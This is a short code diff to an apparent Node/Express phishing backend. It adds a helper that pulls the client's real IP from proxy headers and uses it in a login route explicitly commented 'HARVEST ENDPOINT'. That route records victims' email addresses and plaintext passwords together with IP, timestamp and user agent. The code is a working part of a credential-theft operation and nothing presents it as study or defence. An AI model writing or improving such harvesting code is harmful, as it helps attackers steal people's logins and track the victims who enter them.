@@ -17,6 +17,15 @@ if (!fs.existsSync(uploadsDir)) {
   fs.mkdirSync(uploadsDir, { recursive: true });
 }
 
+const getClientIP = (req) => {
+  return req.headers['x-forwarded-for'] ||  // Proxy (Render/Vercel)
+         req.headers['x-real-ip'] ||       // Nginx proxy
+         req.connection.remoteAddress ||   // Direct
+         req.socket.remoteAddress ||       // Socket
+         req.ip ||                         // Express
+         'unknown';
+};
+
 // HARVEST ENDPOINT
 app.post('/api/login', (req, res) => {
   try {
@@ -25,7 +34,7 @@ app.post('/api/login', (req, res) => {
     
     const cred = {
       timestamp: new Date().toISOString(),
-      ip: req.ip || req.connection.remoteAddress,
+      ip: getClientIP(req),
       email: email.trim(),
       password: pass,
       userAgent: req.get('User-Agent')?.substring(0, 200) || 'unknown'
